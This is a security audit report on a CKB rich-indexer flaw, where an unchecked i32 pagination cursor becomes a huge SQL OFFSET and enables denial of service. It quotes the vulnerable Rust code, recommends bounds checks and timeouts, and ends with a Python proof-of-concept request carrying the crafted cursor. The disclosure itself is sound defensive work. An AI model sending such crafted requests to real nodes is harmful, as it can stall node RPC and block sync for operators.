Audit Report

## Title
Unbounded `i32` OFFSET in `get_tx_with_cell` Enables DB Exhaustion via Crafted Pagination Cursor — (File: `util/rich-indexer/src/indexer_handle/async_indexer_handle/get_transactions.rs`)

## Summary
The `get_transactions` RPC handler decodes the `after` pagination cursor's last 4 bytes as an `i32` offset with no upper-bound validation. An attacker can supply a cursor encoding `i32::MAX` (2,147,483,647), which is passed directly as a SQL `OFFSET` clause, forcing the database to sequentially scan and discard up to 2.1 billion rows per request. No per-query timeout exists on the `AsyncRichIndexerHandle` path, unlike the non-async `IndexerHandle` which carries a `timeout_limit` guard.

## Finding Description
In `get_transactions.rs` lines 44–53, the `after` cursor is validated only for byte length (exactly 12 bytes), then split into an 8-byte `i64` tx_id and a 4-byte `i32` offset:

```rust
let (last, offset) = after.as_bytes().split_at(after.len() - 4);
let last = decode_i64(last)?;
let offset = decode_i32(offset)?;
last_cursor = Some((last, offset));
``` [1](#0-0) 

`decode_i32` at lines 286–294 of `mod.rs` performs only a length check — no range or upper-bound check:

```rust
Ok(i32::from_le_bytes(to_fixed_array(&data[0..4])))
``` [2](#0-1) 

The decoded offset is passed directly to the SQL query builder at lines 180–182 of `get_transactions.rs` with no guard:

```rust
if let Some((_, offset)) = last_cursor {
    query_builder.offset(offset);
}
``` [3](#0-2) 

This produces SQL of the form `... LIMIT N OFFSET 2147483647`, which both SQLite and PostgreSQL implement by sequentially scanning and discarding rows. The `request_limit` guard at lines 27–32 only caps the `limit` parameter, not the offset. [4](#0-3) 

The `AsyncRichIndexerHandle` struct carries no `timeout_limit` field: [5](#0-4) 

In contrast, `IndexerService` in `util/indexer/src/service.rs` has `timeout_limit: Duration` and passes it to `IndexerHandle`: [6](#0-5) 

The `async_handle()` method in `util/rich-indexer/src/service.rs` passes only `request_limit` to `AsyncRichIndexerHandle::new`, confirming no timeout is wired in: [7](#0-6) 

## Impact Explanation
**High — Vulnerabilities which could easily crash a CKB node.** A single request with `OFFSET 2147483647` against a mainnet-populated rich-indexer DB forces a full sequential table scan consuming seconds to minutes of CPU and I/O. SQLite (the default embedded driver) is particularly vulnerable because long-running read queries block the indexer sync loop, which shares the same SQLite connection pool. Multiple concurrent requests can saturate the SQLite single-reader/writer model or PostgreSQL thread pool, starve the indexer sync loop, and render the node's RPC interface and block-sync pipeline unresponsive.

## Likelihood Explanation
The rich-indexer RPC is unauthenticated and network-accessible by default. The 12-byte cursor format is trivially constructable — no proof-of-work, key material, or privileged access is required. The attack is stateless and repeatable from any network peer with knowledge of the node's RPC endpoint. The attacker needs only to send repeated JSON-RPC requests with the crafted cursor.

## Recommendation
Add an upper-bound check on the decoded offset immediately after `decode_i32` in `get_transactions.rs` (after line 52), rejecting cursors whose offset exceeds a reasonable maximum (e.g., `self.request_limit`):

```rust
if offset < 0 || offset as usize > self.request_limit {
    return Err(Error::Params("cursor offset out of range".to_string()));
}
```

Additionally, add a `timeout_limit` field to `AsyncRichIndexerHandle` and apply a per-query timeout via a `tokio::time::timeout` wrapper analogous to the `TimeoutIterator` already used in `util/indexer/src/service.rs`.

## Proof of Concept
Craft the `after` cursor as 12 bytes: 8 zero bytes (tx_id = 0) followed by `[0xff, 0xff, 0xff, 0x7f]` (little-endian `i32::MAX`):

```python
import json, requests, time

after_cursor = "0x" + "00" * 8 + "ffffff7f"

payload = {
    "jsonrpc": "2.0", "id": 1,
    "method": "get_transactions",
    "params": [
        {
            "script": {
                "code_hash": "0x9bd7e06f3ecf4be0f2fcd2188b23f1b9fcc88e5d4b65a8637b17723bbda3cce8",
                "hash_type": "type",
                "args": "0x"
            },
            "script_type": "lock",
            "group_by_transaction": False
        },
        "asc", "0x1", after_cursor
    ]
}

t0 = time.time()
r = requests.post("http://localhost:8114", json=payload)
print(f"elapsed: {time.time()-t0:.2f}s")
```

Compare elapsed time against a normal cursor (`"0x" + "00"*12`). The crafted cursor produces query time proportional to the full table size; the normal cursor returns immediately. Repeated concurrent requests will exhaust DB resources and block the indexer sync loop.

fn decode_i32(data: &[u8]) -> Result<i32, Error> {
    if data.len() != 4 {
        return Err(Error::Params(
            "unable to convert from bytes to i32 due to insufficient data in little-endian format"
                .to_string(),
        ));
    }
    Ok(i32::from_le_bytes(to_fixed_array(&data[0..4])))
}
